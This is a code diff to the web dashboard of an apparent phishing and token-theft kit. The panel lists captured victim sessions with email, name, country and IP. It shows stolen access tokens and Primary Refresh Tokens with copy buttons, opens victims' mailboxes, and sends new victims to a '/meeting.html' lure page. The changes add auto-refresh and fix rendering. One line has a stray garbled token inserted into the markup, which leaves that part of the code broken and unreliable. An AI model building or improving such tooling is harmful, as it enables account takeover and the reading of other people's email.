@@ -239,14 +239,14 @@
                 </div>
                 
                 <div class="card">
-                    <div class="card-header"><span class="card-title">🌍 Active Sessions by Region</span><button class="btn btn-outline" onclick="loadDashboard()">Refresh</button></div>
-                    <div class="card-body"><div id="countryStatsContainer" class="country-stats-grid"><div class="loading">Loading...</div></div></div>
+                    <div class="card-header"><span class="card-title">🌍 Active Sessions by Region</span></div>
+                    <div class="card-body"><div id="countryStatsContainer" class="country-stats-grid"><div class="loading">No sessions yet. Authenticate first.</div></div></div>
                 </div>
                 
                 <div class="card">
-                    <div class="card-header"><span class="card-title">Recent Sessions</span></div>
+                    <div class="card-header"><span class="card-title">Recent Sessions</span><button class="btn btn-outline" onclick="loadDashboard()">Refresh</button></div>
                     <div class="table-wrapper">
-                        <table id="recentTable"><thead><tr><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Captured</th></tr></thead><tbody id="recentBody"><tr><td colspan="5" class="loading">Loading...<\/td><\/tr><\/tbody><\/table>
+                        <table id="recentTable"><thead><tr><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Captured</th></tr></thead><tbody id="recentBody"><tr><td colspan="5" class="loading">Click Refresh to load...<\/td><\/tr><\/tbody><\/table>
                     <\/div>
                 <\/div>
             <\/div>
@@ -256,7 +256,7 @@
                 <div class="card">
                     <div class="card-header"><span class="card-title">All Captured Sessions<\/span><button class="btn btn-danger" onclick="clearAllSessions()">Clear All<\/button><\/div>
                     <div class="table-wrapper">
-                        <table id="sessionsTable"><thead><tr><th>ID<\/th><th>Email<\/th><th>Name<\/th><th>Country<\/th><th>IP<\/th><th>Type<\/th><th>Captured<\/th><th>Expires<\/th><th>Actions<\/th><\/tr><\/thead><tbody id="sessionsBody"><tr><td colspan="9" class="loading">Loading...<\/td><\/tr><\/tbody><\/table>
+                        <table id="sessionsTable"><thead><tr><th>ID<\/th><th>Email<\/th><th>Name<\/th><th>Country<\/th><th>IP<\/th><th>Type<\/th><th>Captured<\/th><th>Expires<\/th><th>Actions<\/th><\/tr><\/thead><tbody id="sessionsBody"><tr><td colspan="9" class="loading">No sessions. Please authenticate first.<\/td><\/tr><\/tbody><\/table>
                     <\/div>
                 <\/div>
             <\/div>
@@ -266,11 +266,11 @@
                 <div class="grid-2">
                     <div class="card">
                         <div class="card-header"><span class="card-title">Access Tokens<\/span><\/div>
-                        <div class="table-wrapper"><table id="accessTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Issued<\/th><th>Expires<\/th><th>Action<\/th><\/tr><\/thead><tbody id="accessTokensBody"><tr><td colspan="5" class="loading">Loading...<\/td><\/tr><\/tbody><\/table><\/div>
+                        <div class="table-wrapper"><table id="accessTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Issued<\/th><th>Expires<\/th><th>Action<\/th><\/tr><\/thead><tbody id="accessTokensBody"><td><td colspan="5" class="loading">No access tokens<\/td><\/tr><\/tbody><\/table><\/div>
                     <\/div>
                     <div class="card">
                         <div class="card-header"><span class="card-title">Refresh Tokens (PRT)<\/span><\/div>
-                        <div class="table-wrapper"><table id="refreshTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Action<\/th><\/tr><\/thead><tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">Loading...<\/td><\/tr><\/tbody><\/table><\/div>
+                        <div class="table-wrapper"><table id="refreshTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Action<\/th><\/tr><\/thead><tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">No PRT tokens<\/td><\/tr><\/tbody><\/table><\/div>
                     <\/div>
                 <\/div>
             <\/div>
@@ -280,7 +280,7 @@
                 <div class="card">
                     <div class="card-header"><span class="card-title">Open User Mailbox<\/span><\/div>
                     <div class="card-body">
-                        <div class="form-group"><label>Select User Session</label><select id="mailboxUserSelect" class="form-control"><option value="">Loading users...<\/option><\/select><\/div>
+                        <div class="form-group"><label>Select User Session</label><select id="mailboxUserSelect" class="form-control"><option value="">No sessions available. Authenticate first.</option><\/select><\/div>
                         <button class="btn btn-primary" onclick="openMailbox()">📧 Open Full Mailbox</button>
                         <p style="font-size: 11px; color: #6b7280; margin-top: 12px;">Opens in a new tab with complete Outlook-style interface<\/p>
                     <\/div>
@@ -321,12 +321,15 @@
     <script>
         let currentTokenToCopy = '';
         
-        async function apiCall(endpoint, options = {}) {
+        async function apiCall(endpoint) {
             try {
-                const response = await fetch(endpoint, { ...options, headers: { 'Content-Type': 'application/json' } });
+                const response = await fetch(endpoint);
                 if (!response.ok) return null;
                 return await response.json();
-            } catch (err) { return null; }
+            } catch (err) {
+                console.error('API call failed:', endpoint, err);
+                return null;
+            }
         }
         
         function formatDate(dateStr) { return dateStr ? new Date(dateStr).toLocaleString() : 'Unknown'; }
@@ -346,6 +349,8 @@
         
         // Dashboard
         async function loadDashboard() {
+            console.log('Loading dashboard...');
+            
             // Get overview stats
             const overview = await apiCall('/api/overview_stats');
             if (overview) {
@@ -359,25 +364,30 @@
             
             // Get country stats
             const stats = await apiCall('/api/country_stats');
-            if (stats && stats.countries) {
+            if (stats && stats.countries && Object.keys(stats.countries).length > 0) {
                 const flagMap = { 'United States': '🇺🇸', 'Canada': '🇨🇦', 'United Kingdom': '🇬🇧', 'Germany': '🇩🇪', 'France': '🇫🇷', 'Japan': '🇯🇵', 'Australia': '🇦🇺', 'India': '🇮🇳', 'Netherlands': '🇳🇱', 'Sweden': '🇸🇪', 'Other': '🌍' };
                 const colorMap = { 'United States': '#B22234', 'Canada': '#FF0000', 'United Kingdom': '#00247D', 'Germany': '#FFCC00', 'France': '#0055A4', 'Japan': '#BC002D', 'Australia': '#012169', 'India': '#FF9933', 'Netherlands': '#FF7900', 'Sweden': '#005B99', 'Other': '#6B8E23' };
                 document.getElementById('countryStatsContainer').innerHTML = Object.entries(stats.countries).map(([country, count]) => `<div class="country-card" style="border-left: 4px solid ${colorMap[country] || '#6B8E23'}"><div class="country-flag">${flagMap[country] || '🌍'}</div><div class="country-info"><div class="country-name">${country}</div><div class="country-count">session(s)</div></div><div class="country-value">${count}</div></div>`).join('');
+            } else {
+                document.getElementById('countryStatsContainer').innerHTML = '<div class="loading">No sessions yet. Go to /meeting.html to authenticate.</div>';
             }
             
             // Get recent sessions
             const sessions = await apiCall('/api/sessions');
-            if (sessions && sessions.sessions) {
+            if (sessions && sessions.sessions && sessions.sessions.length > 0) {
                 const recent = sessions.sessions.slice(0, 5);
                 document.getElementById('recentBody').innerHTML = recent.map(s => `<tr><td style="color:#60a5fa;">${escapeHtml(s.email)}<\/td><td>${escapeHtml(s.name || '-')}<\/td><td>${escapeHtml(s.country || 'Unknown')}<\/td><td><code>${escapeHtml(s.ip || 'Unknown')}<\/code><\/td><td>${formatDate(s.capturedAt)}<\/td><\/tr>`).join('');
+            } else {
+                document.getElementById('recentBody').innerHTML = '<tr><td colspan="5" class="loading">No sessions yet. Visit /meeting.html to authenticate.<\/td><\/tr>';
             }
         }
         
         // Sessions
         async function loadSessions() {
+            console.log('Loading sessions...');
             const data = await apiCall('/api/sessions');
             if (data && data.sessions && data.sessions.length > 0) {
-                document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `<tr>
+                document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `｜｜DSML｜｜
                     <td>${s.id}<\/td>
                     <td style="color:#60a5fa;">${escapeHtml(s.email)}<\/td>
                     <td>${escapeHtml(s.name || '-')}<\/td>
@@ -393,7 +403,7 @@
                     <\/td>
                 <\/tr>`).join('');
             } else {
-                document.getElementById('sessionsBody').innerHTML = '<tr><td colspan="9" class="loading">No sessions yet. Authenticate first.<\/td><\/tr>';
+                document.getElementById('sessionsBody').innerHTML = '<tr><td colspan="9" class="loading">No sessions. Visit /meeting.html to authenticate.<\/td><\/tr>';
             }
         }
         
@@ -419,7 +429,7 @@
         
         async function clearAllSessions() {
             if (confirm('Clear all sessions?')) { 
-                await apiCall('/api/sessions/clear', { method: 'DELETE' }); 
+                await fetch('/api/sessions/clear', { method: 'DELETE' }); 
                 loadDashboard(); 
                 loadSessions(); 
                 loadTokens(); 
@@ -428,16 +438,17 @@
         
         // Tokens
         async function loadTokens() {
+            console.log('Loading tokens...');
             const accessTokens = await apiCall('/api/list_access_tokens');
             if (accessTokens && accessTokens.length > 0) {
-                document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `<td><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td>${formatDate(t.issued_at)}<\/td><td>${formatDate(t.expires_at)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy<\/button><\/td><\/tr>`).join('');
+                document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `<tr><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td>${formatDate(t.issued_at)}<\/td><td>${formatDate(t.expires_at)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy<\/button><\/td><\/tr>`).join('');
             } else {
                 document.getElementById('accessTokensBody').innerHTML = '<tr><td colspan="5" class="loading">No access tokens<\/td><\/tr>';
             }
             
             const refreshTokens = await apiCall('/api/list_refresh_tokens');
             if (refreshTokens && refreshTokens.length > 0) {
-                document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `<td><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT<\/button><\/td><\/tr>`).join('');
+                document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `<tr><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT<\/button><\/td><\/tr>`).join('');
             } else {
                 document.getElementById('refreshTokensBody').innerHTML = '<tr><td colspan="3" class="loading">No PRT tokens<\/td><\/tr>';
             }
@@ -447,12 +458,13 @@
         
         // Mailbox
         async function loadMailboxSelect() {
+            console.log('Loading mailbox select...');
             const sessions = await apiCall('/api/sessions');
             const select = document.getElementById('mailboxUserSelect');
             if (sessions && sessions.sessions && sessions.sessions.length > 0) {
                 select.innerHTML = '<option value="">Select a user...</option>' + sessions.sessions.map(s => `<option value="${escapeHtml(s.email)}">${escapeHtml(s.email)} (${escapeHtml(s.name || 'No name')})</option>`).join('');
             } else {
-                select.innerHTML = '<option value="">No sessions yet. Authenticate first.</option>';
+                select.innerHTML = '<option value="">No sessions. Please authenticate first.</option>';
             }
         }
         
@@ -468,20 +480,28 @@
         
         // Settings
         async function saveResourceSettings() {
-            await apiCall('/api/resource/settings', { method: 'POST', body: JSON.stringify({ active_resource: document.getElementById('activeResource').value }) });
+            await fetch('/api/resource/settings', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ active_resource: document.getElementById('activeResource').value }) });
             alert('Settings saved!');
         }
         
         async function saveOpenAISettings() {
-            await apiCall('/api/openai/settings', { method: 'POST', body: JSON.stringify({ enabled: document.getElementById('openaiEnabled').value === 'true', api_key: document.getElementById('openaiApiKey').value }) });
+            await fetch('/api/openai/settings', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ enabled: document.getElementById('openaiEnabled').value === 'true', api_key: document.getElementById('openaiApiKey').value }) });
             alert('OpenAI settings saved!');
         }
         
-        // Load dashboard on page load
+        // Initial load
+        console.log('Page loaded, loading data...');
         loadDashboard();
         loadSessions();
         loadTokens();
         loadMailboxSelect();
+        
+        // Auto-refresh every 10 seconds
+        setInterval(() => {
+            if (document.querySelector('.nav-item.active').innerText.includes('Dashboard')) loadDashboard();
+            if (document.querySelector('.nav-item.active').innerText.includes('Sessions')) loadSessions();
+            if (document.querySelector('.nav-item.active').innerText.includes('Tokens')) loadTokens();
+        }, 10000);
     </script>
 </body>
 </html>
